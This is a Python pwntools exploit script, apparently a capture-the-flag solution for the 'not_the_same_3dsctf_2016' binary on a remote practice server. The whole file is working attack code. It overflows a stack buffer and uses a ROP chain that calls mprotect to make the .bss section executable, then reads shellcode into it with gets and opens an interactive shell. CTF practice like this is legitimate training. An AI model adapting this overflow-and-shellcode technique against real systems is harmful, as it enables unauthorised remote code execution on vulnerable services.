from pwn import *

pop_3_ret_addr = 0x0809e3e5
pop_2_ret_addr = 0x0809a6fc
pop_1_ret_addr = 0x080481ad

bss_addr = 0x080EC000
bss_len = 0x2000

#p = process('./not_the_same_3dsctf_2016')
p = remote('node3.buuoj.cn', 28377)
elf = ELF('not_the_same_3dsctf_2016')

mprotect_addr = elf.symbols['mprotect']
port = 1 + 2 + 4

gets_addr = elf.symbols['gets']

shellcode = asm(shellcraft.sh(), os = 'linux', arch = 'i386')

payload = b'a' * 0x2d + p32(mprotect_addr) + p32(pop_3_ret_addr) + p32(bss_addr) + p32(bss_len) + p32(port)
payload += p32(gets_addr) + p32(pop_1_ret_addr) + p32(bss_addr) + p32(bss_addr)

p.sendline(payload)
p.sendline(shellcode)

p.interactive()
